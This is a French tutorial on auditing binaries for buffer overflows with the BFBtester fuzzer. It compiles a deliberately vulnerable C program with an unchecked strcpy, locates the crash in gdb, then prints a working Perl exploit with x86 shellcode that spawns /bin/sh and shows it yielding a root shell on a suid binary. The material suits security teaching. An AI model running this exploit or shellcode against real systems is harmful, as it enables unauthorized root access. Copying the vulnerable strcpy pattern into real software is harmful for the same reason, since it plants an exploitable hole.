@@ -1,0 +1,132 @@
+ Introduction
+
+Les vulnérabilités de type buffer overflow sont sûrement les plus répandues dans les systèmes Unix et Win32.
+De nombreux binaires comme par exemple "su", "sudo" ou "linuxconf" sous linux ont un jour étés touchés par ce type de vulnérabilité. Comment détecter cette faiblesse sans avoir le code source sous la main ? BFBtester est la réponse.
+BFBTester est un outil qui permet d'auditer la sécurité de binaires quand vous n'avez pas le code source. Pour ce faire, BFBtester par tenter de découvrir pour vous si ce binaire est vulnérable à un faille de type "buffer overflow" (dépassement de mémoire tampon) en exécutant le binaire avec des arguments de grand longueur combinés avec des switch variés et test aussi les variables d'environnement. Un exemple valant mieux qu'un long discours, nous avons testé pour vous BFBtester.
+Configuration
+
+Configuration de notre machine:
+[root@crazy acz]# uname -a
+Linux crazy 2.4.19-16mdk #1 Fri Sep 20 18:15:05 CEST 2002 i686 unknown unknown GNU/Linux
+Pour cet exemple, nous allons utiliser un programme très simple dont nous savons qu'il est vulnérable à un buffer overflow. Cependant, une fois compilé il faudra en oublier le code source.
+
+/* foo.c */
+
+#include
+int main(int argc, char **argv)
+{
+char buffer[180];
+if(argc>1)
+strcpy(buffer,argv[1]);
+printf("Miam...\n");
+}
+
+On le compile.
+[acz@crazy acz]$ gcc -o foo foo.c
+[acz@crazy acz]$
+Utilisation de bfbtester
+
+On utilise bfbtester pour le tester et essayer de découvrir un problème de buffer overflow.
+
+[acz@crazy acz]$ bfbtester -at foo
+=> /home/acz/foo
+* Single argument testing
+* Multiple arguments testing
+*** Crash ***
+args: [51200]
+envs:
+Signal: 11 ( Segmentation fault )
+Core? Yes
+
+BFBtester vient de mettre en évidence le problème, essayons de le reproduire manuellement.
+[acz@crazy acz]$ ./foo `perl -e 'print "A"x51200'`
+Miam...
+Segmentation fault (core dumped)
+
+Excellent, le problème est bien là, BFBtester ne s'est pas trompé. Maintenant essayons de trouver manuellement la limite du segfault.
+
+[acz@crazy acz]$ ./foo `perl -e 'print "A"x203'`
+Miam...
+[acz@crazy acz]$ ./foo `perl -e 'print "A"x204'`
+Miam...
+Segmentation fault (core dumped)
+[acz@crazy acz]$ ./foo `perl -e 'print "A"x208'`
+Miam...
+Segmentation fault (core dumped)
+
+Notre programme segfault quand on lui soumet argument d'une longueur supérieure à 204 caractères. Que se passe t'il au niveau de la pile ? gdb est notre ami.
+
+[acz@crazy acz]$ gdb foo
+GNU gdb 5.2.1-2mdk (Mandrake Linux)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are welcome to change it and/or distribute copies of it under certain conditions. Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu"...
+(gdb) run `perl -e 'print "A"x208'`
+Starting program: /home/acz/foo `perl -e 'print "A"x208'`
+Miam...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info reg
+eax 0x8 8
+ecx 0x40137620 1075017248
+edx 0x8 8
+ebx 0x4013a340 1075028800
+esp 0xbffff970 0xbffff970
+ebp 0x41414141 0x41414141
+esi 0x40011a4c 1073814092
+edi 0xbffff9c4 -1073743420
+eip 0x41414141 0x41414141
+eflags 0x10286 66182
+Incorporation du shellcode
+
+Parfait ! On peut écrasé l'EIP, on remarque que dans notre cas l'EIP a été écrasée par 0x41414141qui vaut "A". Notre programme est donc exploitable, on pourrait l'utiliser si il était suid pour obtenir un shell root. Maintenant, nous allons écrire l'exploit qui va permettre d'utiliser cette vulnérabilité. Désolé pour les puristes, mais nous allons l'écrire en perl ;-)
+
+#!/usr/bin/perl
+### le shellcode qui execute /bin/sh
+$shellcode = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" .
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+### l'adresse de retour / ESP
+$ret = 0xbffff970;
+### la taille du buffer
+$buf = 208;
+$egg = 2000;
+$nop = "\x90";
+$offset = 0;
+if (@ARGV == 1) { $offset = $ARGV[0]; }
+$addr = pack('l', ($ret + $offset));
+for ($i = 0; $i < $buf; $i += 4) {
+$buffer .= $addr;
+}
+for ($i = 0; $i < ($egg - length($shellcode) - 100); $i++){
+$buffer .= $nop;
+}
+$buffer .= $shellcode;
+exec("./foo", $buffer,0);
+Test de l'exploit
+
+Testons notre exploit.
+[acz@crazy acz]$ perl x.pl
+Miam...
+
+Rien ne se passe, il va falloir trouver le bon offset pour notre système.
+[acz@crazy acz]$ ./x.pl 20
+Miam...
+[acz@crazy acz]$ ./x.pl 80
+Miam...
+sh-2.05b$
+
+Bingo, le shell code est passé, /bin/sh a été exécuté, notre exploit a fonctionné. Cependant nous n'avons pas un shell root car notre binaire n'était pas suid. Essayons pour voir...
+[root@crazy acz]# chmod 4755 foo && chown root.root foo && ls -al foo -rwsr-xr-x 1 root root 11470 avr 20 10:24 foo*
+Notre binaire est maintenant suid, si l'exploit fonctionne nous obtiendrons un shell root.
+
+[acz@crazy acz]$ id
+uid=501(acz) gid=501(acz) groupes=501(acz)
+[acz@crazy acz]$ ./x.pl 80
+Miam...
+sh-2.05b# id
+uid=0(root) gid=501(acz) groups=501(acz)
